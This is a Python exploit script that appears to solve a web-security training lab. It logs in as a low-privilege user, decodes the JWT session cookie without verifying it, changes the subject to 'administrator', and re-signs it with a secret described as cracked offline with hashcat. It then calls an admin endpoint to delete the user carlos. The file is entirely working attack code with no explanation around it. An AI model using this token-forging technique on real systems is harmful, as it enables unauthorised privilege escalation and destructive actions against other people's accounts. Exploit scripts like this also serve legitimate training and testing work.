import requests
import sys
import time
import jwt
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

SIGNING_SECRET = "secret1"


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None


def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
        r = s.post(login_page, data=data, verify=False, proxies=proxies, timeout=10)
        if f"Your username is: {username}" in r.text:
            return True
    return False


def forge_admin_cookie(s):
    cookie = s.cookies.get("session")
    if not cookie:
        return False

    # We already know the signing secret (cracked offline with hashcat
    # against the rockyou-style wordlist, mode 16500), so we can just sign
    # a fresh HS256 token ourselves instead of tampering with alg=none.
    header = jwt.get_unverified_header(cookie)
    payload = jwt.decode(cookie, options={"verify_signature": False})
    payload["sub"] = "administrator"

    forged = jwt.encode(payload, SIGNING_SECRET, algorithm="HS256", headers=header)
    s.cookies.set("session", forged)
    return True


def delete_carlos(s, url):
    r = s.get(url + "/admin/delete?username=carlos", verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(url + "/", verify=False, proxies=proxies, timeout=10)
        if 'Congratulations' in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    if not forge_admin_cookie(s):
        print("[-] Failed to forge admin cookie")
        return False
    print(f"[+] Forged session cookie signed with cracked secret '{SIGNING_SECRET}', sub=administrator")

    if not delete_carlos(s, url):
        print("[-] Failed to delete carlos")
        return False
    print("[+] Deleted carlos")

    check_solved(s, url)


if __name__ == "__main__":
    main()